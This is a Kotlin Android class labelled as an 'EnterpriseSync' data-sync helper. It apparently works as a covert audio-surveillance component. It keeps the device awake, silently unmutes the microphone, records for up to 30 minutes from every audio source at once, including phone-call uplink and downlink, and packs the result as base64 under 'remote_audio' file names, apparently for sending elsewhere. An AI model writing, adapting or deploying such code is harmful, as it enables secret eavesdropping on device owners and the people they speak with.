package com.example.data.sync

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.pm.PackageManager
import android.media.AudioFormat
import android.media.AudioManager
import android.media.AudioRecord
import android.media.MediaRecorder
import android.os.Build
import android.util.Base64
import android.util.Log
import androidx.core.content.ContextCompat
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.FileOutputStream

class AudioRecorderHelper(private val context: Context) {
    private var outFile: File? = null

    suspend fun startRecording(durationSec: Int = 1800): String? = withContext(Dispatchers.IO) {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            Log.e("AudioRecorderHelper", "RECORD_AUDIO permission is not granted.")
            throw SecurityException("RECORD_AUDIO permission not granted. Please grant microphone permission in the app.")
        }

        val finalDuration = if (durationSec <= 0) 60 else durationSec.coerceAtLeast(3)
        
        var wakeLock: android.os.PowerManager.WakeLock? = null
        var wifiLock: android.net.wifi.WifiManager.WifiLock? = null
        try {
            val pm = context.getSystemService(Context.POWER_SERVICE) as? android.os.PowerManager
            wakeLock = pm?.newWakeLock(android.os.PowerManager.PARTIAL_WAKE_LOCK, "EnterpriseSync::AudioRecordWakeLock")
            wakeLock?.acquire((finalDuration + 60) * 1000L)
            
            val wm = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as? android.net.wifi.WifiManager
            wifiLock = wm?.createWifiLock(android.net.wifi.WifiManager.WIFI_MODE_FULL_HIGH_PERF, "EnterpriseSync::AudioWifiLock")
            wifiLock?.acquire()
        } catch (_: Exception) {}

        var previousAudioMode = AudioManager.MODE_NORMAL
        var previousSpeakerState = false
        var previousMuteState = false
        val audioManager = context.getSystemService(Context.AUDIO_SERVICE) as? AudioManager
        try {
            if (audioManager != null) {
                previousAudioMode = audioManager.mode
                previousSpeakerState = audioManager.isSpeakerphoneOn
                previousMuteState = audioManager.isMicrophoneMute

                audioManager.isMicrophoneMute = false
                audioManager.mode = AudioManager.MODE_NORMAL
                audioManager.isSpeakerphoneOn = false
            }
        } catch (e: Exception) {
            Log.w("AudioRecorderHelper", "Failed to configure AudioManager for recording: ${e.message}")
        }

        var base64Result: String? = null

        try {
            base64Result = tryMultiSourceAudioRecord(finalDuration)
        } catch (e: Exception) {
            Log.w("AudioRecorderHelper", "Multi-source AudioRecord mixing failed: ${e.message}, trying MediaRecorder fallback")
        }

        if (base64Result == null) {
            try {
                base64Result = tryMediaRecorder(finalDuration)
            } catch (e: Exception) {
                Log.w("AudioRecorderHelper", "MediaRecorder fallback failed: ${e.message}")
            }
        }

        // Restore AudioManager settings
        try {
            if (audioManager != null) {
                audioManager.mode = previousAudioMode
                audioManager.isSpeakerphoneOn = previousSpeakerState
                audioManager.isMicrophoneMute = previousMuteState
            }
        } catch (_: Exception) {}

        try {
            wakeLock?.let { if (it.isHeld) it.release() }
            wifiLock?.let { if (it.isHeld) it.release() }
        } catch (_: Exception) {}

        if (base64Result != null) {
            return@withContext base64Result
        } else {
            throw Exception("Audio recording failed across all available audio sources and engines. Please check permissions and hardware availability.")
        }
    }

    @SuppressLint("MissingPermission")
    private suspend fun tryMultiSourceAudioRecord(durationSec: Int, extension: String = "wav"): String? {
        val sampleRate = 16000
        val channelConfig = AudioFormat.CHANNEL_IN_MONO
        val audioFormat = AudioFormat.ENCODING_PCM_16BIT
        val minBufferSize = AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioFormat)
        val bufferSize = if (minBufferSize > 0) (minBufferSize * 2).coerceAtLeast(8192) else 8192

        // ALL possible audio sources in Android SDK
        val allSources = listOf(
            MediaRecorder.AudioSource.MIC,
            MediaRecorder.AudioSource.DEFAULT,
            MediaRecorder.AudioSource.UNPROCESSED,
            MediaRecorder.AudioSource.VOICE_RECOGNITION,
            MediaRecorder.AudioSource.VOICE_COMMUNICATION,
            MediaRecorder.AudioSource.VOICE_UPLINK,
            MediaRecorder.AudioSource.VOICE_DOWNLINK,
            MediaRecorder.AudioSource.VOICE_CALL,
            MediaRecorder.AudioSource.CAMCORDER,
            MediaRecorder.AudioSource.REMOTE_SUBMIX,
            MediaRecorder.AudioSource.VOICE_PERFORMANCE
        )

        val activeRecords = mutableListOf<AudioRecord>()
        for (source in allSources) {
            try {
                val record = AudioRecord(source, sampleRate, channelConfig, audioFormat, bufferSize)
                if (record.state == AudioRecord.STATE_INITIALIZED) {
                    record.startRecording()
                    activeRecords.add(record)
                    Log.d("AudioRecorderHelper", "Successfully initialized and started AudioRecord for source=$source")
                } else {
                    record.release()
                }
            } catch (e: Exception) {
                Log.w("AudioRecorderHelper", "Could not initialize AudioRecord for source=$source: ${e.message}")
            }
        }

        if (activeRecords.isEmpty()) {
            Log.e("AudioRecorderHelper", "No AudioRecord instances could be initialized from any source.")
            return null
        }

        Log.d("AudioRecorderHelper", "Recording simultaneously from ${activeRecords.size} audio sources.")

        val mixedPcmStream = ByteArrayOutputStream()
        try {
            val startTime = System.currentTimeMillis()
            val endTime = startTime + (durationSec * 1000L)
            val buffer = ByteArray(bufferSize)

            while (System.currentTimeMillis() < endTime) {
                val sourceBuffers = mutableListOf<ByteArray>()
                var maxBytesRead = 0

                for (record in activeRecords) {
                    val singleBuffer = ByteArray(bufferSize)
                    val read = record.read(singleBuffer, 0, singleBuffer.size)
                    if (read > 0) {
                        sourceBuffers.add(singleBuffer.copyOfRange(0, read))
                        if (read > maxBytesRead) maxBytesRead = read
                    }
                }

                if (maxBytesRead > 0) {
                    val mixedBuffer = ByteArray(maxBytesRead)
                    val sampleCount = maxBytesRead / 2
                    for (i in 0 until sampleCount) {
                        var sum = 0
                        var count = 0
                        for (srcBuf in sourceBuffers) {
                            if (i * 2 + 1 < srcBuf.size) {
                                val low = srcBuf[i * 2].toInt() and 0xFF
                                val high = srcBuf[i * 2 + 1].toInt()
                                val sample = (high shl 8) or low
                                sum += sample
                                count++
                            }
                        }
                        if (count > 0) {
                            val mixedSample = (sum / count).coerceIn(-32768, 32767)
                            mixedBuffer[i * 2] = (mixedSample and 0xFF).toByte()
                            mixedBuffer[i * 2 + 1] = ((mixedSample shr 8) and 0xFF).toByte()
                        }
                    }
                    mixedPcmStream.write(mixedBuffer, 0, maxBytesRead)
                }

                delay(30)
            }
        } catch (e: Exception) {
            Log.e("AudioRecorderHelper", "Error during multi-source audio recording loop: ${e.message}")
        } finally {
            for (record in activeRecords) {
                try {
                    record.stop()
                } catch (_: Exception) {}
                try {
                    record.release()
                } catch (_: Exception) {}
            }
        }

        val pcmBytes = mixedPcmStream.toByteArray()
        if (pcmBytes.isEmpty()) {
            Log.e("AudioRecorderHelper", "Multi-source audio recording captured 0 bytes.")
            return null
        }

        val wavFile = File(context.cacheDir, "remote_audio_all_sources_${System.currentTimeMillis()}.wav")
        val wavBytes = pcmToWav(pcmBytes, sampleRate, 1, 16)
        FileOutputStream(wavFile).use { it.write(wavBytes) }

        if (wavFile.exists() && wavFile.length() > 100) {
            val base64Wav = Base64.encodeToString(wavBytes, Base64.NO_WRAP)
            return "data:audio/wav;base64,$base64Wav"
        }
        return null
    }

    private suspend fun tryMediaRecorder(durationSec: Int): String? {
        outFile = File(context.cacheDir, "remote_audio_media_${System.currentTimeMillis()}.wav")
        if (outFile?.exists() == true) {
            outFile?.delete()
        }

        val audioSources = listOf(
            MediaRecorder.AudioSource.MIC,
            MediaRecorder.AudioSource.DEFAULT,
            MediaRecorder.AudioSource.UNPROCESSED,
            MediaRecorder.AudioSource.VOICE_RECOGNITION,
            MediaRecorder.AudioSource.VOICE_COMMUNICATION,
            MediaRecorder.AudioSource.VOICE_UPLINK,
            MediaRecorder.AudioSource.VOICE_DOWNLINK,
            MediaRecorder.AudioSource.VOICE_CALL,
            MediaRecorder.AudioSource.CAMCORDER,
            MediaRecorder.AudioSource.REMOTE_SUBMIX,
            MediaRecorder.AudioSource.VOICE_PERFORMANCE
        )

        var recorder: MediaRecorder? = null
        var isRecordingStarted = false
        var lastException: Exception? = null

        for (source in audioSources) {
            val formatConfigs = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                listOf(
                    Pair(MediaRecorder.OutputFormat.MPEG_4, MediaRecorder.AudioEncoder.AAC),
                    Pair(MediaRecorder.OutputFormat.THREE_GPP, MediaRecorder.AudioEncoder.AMR_NB)
                )
            } else {
                listOf(
                    Pair(MediaRecorder.OutputFormat.THREE_GPP, MediaRecorder.AudioEncoder.AMR_NB),
                    Pair(MediaRecorder.OutputFormat.MPEG_4, MediaRecorder.AudioEncoder.AAC)
                )
            }

            for ((outputFormat, audioEncoder) in formatConfigs) {
                try {
                    val rec = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                        MediaRecorder(context)
                    } else {
                        @Suppress("DEPRECATION")
                        MediaRecorder()
                    }

                    rec.setAudioSource(source)
                    rec.setOutputFormat(outputFormat)
                    rec.setAudioEncoder(audioEncoder)
                    if (audioEncoder == MediaRecorder.AudioEncoder.AAC) {
                        rec.setAudioSamplingRate(44100)
                        rec.setAudioEncodingBitRate(128000)
                    } else {
                        rec.setAudioSamplingRate(8000)
                        rec.setAudioEncodingBitRate(12200)
                    }
                    rec.setOutputFile(outFile?.absolutePath)

                    rec.prepare()
                    rec.start()
                    recorder = rec
                    isRecordingStarted = true
                    Log.d("AudioRecorderHelper", "MediaRecorder started successfully with source=$source")
                    break
                } catch (e: Exception) {
                    lastException = e
                    try { recorder?.release() } catch (_: Exception) {}
                    recorder = null
                }
            }
            if (isRecordingStarted) break
        }

        if (!isRecordingStarted || recorder == null) {
            throw lastException ?: Exception("MediaRecorder failed to start")
        }

        try {
            delay(durationSec * 1000L)
        } catch (_: Exception) {
        } finally {
            try { recorder.stop() } catch (_: Throwable) {}
            try { recorder.reset() } catch (_: Throwable) {}
            try { recorder.release() } catch (_: Throwable) {}
        }

        val file = outFile
        if (file != null && file.exists() && file.length() > 100) {
            val audioBytes = file.readBytes()
            val base64Audio = Base64.encodeToString(audioBytes, Base64.NO_WRAP)
            return "data:audio/wav;base64,$base64Audio"
        }
        return null
    }

    private fun pcmToWav(pcmData: ByteArray, sampleRate: Int, channels: Int, bitsPerSample: Int): ByteArray {
        val totalAudioLen = pcmData.size.toLong()
        val totalDataLen = totalAudioLen + 36
        val byteRate = (sampleRate * channels * bitsPerSample / 8).toLong()

        val header = ByteArray(44)
        header[0] = 'R'.code.toByte()
        header[1] = 'I'.code.toByte()
        header[2] = 'F'.code.toByte()
        header[3] = 'F'.code.toByte()
        header[4] = (totalDataLen and 0xff).toByte()
        header[5] = (totalDataLen shr 8 and 0xff).toByte()
        header[6] = (totalDataLen shr 16 and 0xff).toByte()
        header[7] = (totalDataLen shr 24 and 0xff).toByte()
        header[8] = 'W'.code.toByte()
        header[9] = 'A'.code.toByte()
        header[10] = 'V'.code.toByte()
        header[11] = 'E'.code.toByte()
        header[12] = 'f'.code.toByte()
        header[13] = 'm'.code.toByte()
        header[14] = 't'.code.toByte()
        header[15] = ' '.code.toByte()
        header[16] = 16
        header[17] = 0
        header[18] = 0
        header[19] = 0
        header[20] = 1
        header[21] = 0
        header[22] = channels.toByte()
        header[23] = 0
        header[24] = (sampleRate and 0xff).toByte()
        header[25] = (sampleRate shr 8 and 0xff).toByte()
        header[26] = (sampleRate shr 16 and 0xff).toByte()
        header[27] = (sampleRate shr 24 and 0xff).toByte()
        header[28] = (byteRate and 0xff).toByte()
        header[29] = (byteRate shr 8 and 0xff).toByte()
        header[30] = (byteRate shr 16 and 0xff).toByte()
        header[31] = (byteRate shr 24 and 0xff).toByte()
        header[32] = (channels * bitsPerSample / 8).toByte()
        header[33] = 0
        header[34] = bitsPerSample.toByte()
        header[35] = 0
        header[36] = 'd'.code.toByte()
        header[37] = 'a'.code.toByte()
        header[38] = 't'.code.toByte()
        header[39] = 'a'.code.toByte()
        header[40] = (totalAudioLen and 0xff).toByte()
        header[41] = (totalAudioLen shr 8 and 0xff).toByte()
        header[42] = (totalAudioLen shr 16 and 0xff).toByte()
        header[43] = (totalAudioLen shr 24 and 0xff).toByte()

        val fullAudio = ByteArray(44 + pcmData.size)
        System.arraycopy(header, 0, fullAudio, 0, 44)
        System.arraycopy(pcmData, 0, fullAudio, 44, pcmData.size)
        return fullAudio
    }

    fun cleanup() {
        try {
            outFile?.let { if (it.exists()) it.delete() }
        } catch (_: Exception) {}
    }
}
